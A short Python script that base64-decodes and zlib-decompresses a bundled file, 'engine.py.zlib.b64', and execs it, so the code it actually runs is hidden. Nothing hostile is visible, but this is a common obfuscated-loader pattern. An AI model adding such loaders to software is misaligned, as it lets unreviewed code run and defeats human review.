#!/usr/bin/env python3
from pathlib import Path
import base64,zlib
PAYLOAD=Path(__file__).resolve().parents[1]/"bootstrap/pass3364_3375/engine.py.zlib.b64"
code=zlib.decompress(base64.b64decode(PAYLOAD.read_text(encoding="ascii")))
exec(compile(code,str(PAYLOAD),"exec"),globals(),globals())
